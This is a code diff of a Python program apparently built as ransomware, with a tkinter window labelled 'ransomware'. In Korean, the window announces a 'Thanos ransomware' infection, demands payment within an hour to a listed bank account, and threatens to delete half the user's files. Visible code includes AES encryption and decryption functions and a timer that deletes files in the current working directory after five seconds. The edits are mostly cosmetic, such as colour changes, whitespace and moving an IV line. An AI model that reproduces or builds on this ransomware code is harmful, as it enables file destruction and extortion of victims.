@@ -21,6 +21,7 @@ import smtplib
 import uuid
 from email.mime.text import MIMEText
 
+iv = os.urandom(16)
 
 # 버튼클릭시 복호화될수 있게
 def key_submit():
@@ -31,7 +32,6 @@ def key_submit():
     label4.destroy()
     password.destroy()
 
-
 # gui 창 객체입니다
 window = tkinter.Tk()
 window.title("ransomware")
@@ -40,11 +40,11 @@ height = window.winfo_height()  # ...
 width = window.winfo_width()
 window.configure(background="black")
 
-label1 = tkinter.Label(window, text="타노스 랜섬웨어에 감염되었다.", fg="red", bg="black", font='Helvetica 14 bold')
+label1 = tkinter.Label(window, text="타노스 랜섬웨어에 감염되었다.", fg="green", bg="black", font='Helvetica 14 bold')
 label1.pack()
-label2 = tkinter.Label(window, text="1시간 안에 돈을 보내주지 않으면 파일이 삭제된다.", fg="red", bg="black", font='Helvetica 18 bold')
+label2 = tkinter.Label(window, text="1시간 안에 돈을 보내주지 않으면 파일이 절반 삭제된다.", fg="green", bg="black", font='Helvetica 18 bold')
 label2.pack()
-label3 = tkinter.Label(window, text="국민 786102-00-040854", fg="red", bg="black", font='Helvetica 18 bold')
+label3 = tkinter.Label(window, text="국민 786102-00-040854", fg="green", bg="black", font='Helvetica 18 bold')
 label3.pack()
 
 label4 = tkinter.Label(window, text="password:", fg="red", bg="black", font='Helvetica 14 bold')
@@ -59,9 +59,6 @@ image = tkinter.PhotoImage(file="ui/face.png")
 
 label5 = tkinter.Label(window, image=image)
 label5.pack()
-
-
-iv = os.urandom(16)
 
 def list_files(path, ext=None):
     filelist=[]
@@ -82,6 +79,7 @@ def startTimer():
     print("파일 삭제를 시작합니다")
     #5초에 한번씩 파일 삭제
     #threading.Timer(5,remove_files(os.getcwd())).start()
+
     sleep(5)
     remove_files(os.getcwd())
 
@@ -189,6 +187,7 @@ def enc(key, cipher, in_filename, out_filename=None):
         print(result.read())
 
     print("---END ENCRYPTION : AES")
+
 def dec( cipher, in_filename, out_filename):
     print("---START DECRYPTION : AES")
 
@@ -247,7 +246,6 @@ def dec( cipher, in_filename, out_filename):
         print(result.read())
 
     print("---END DECRYPTION : AES")
-
 
 if __name__ == "__main__":
 
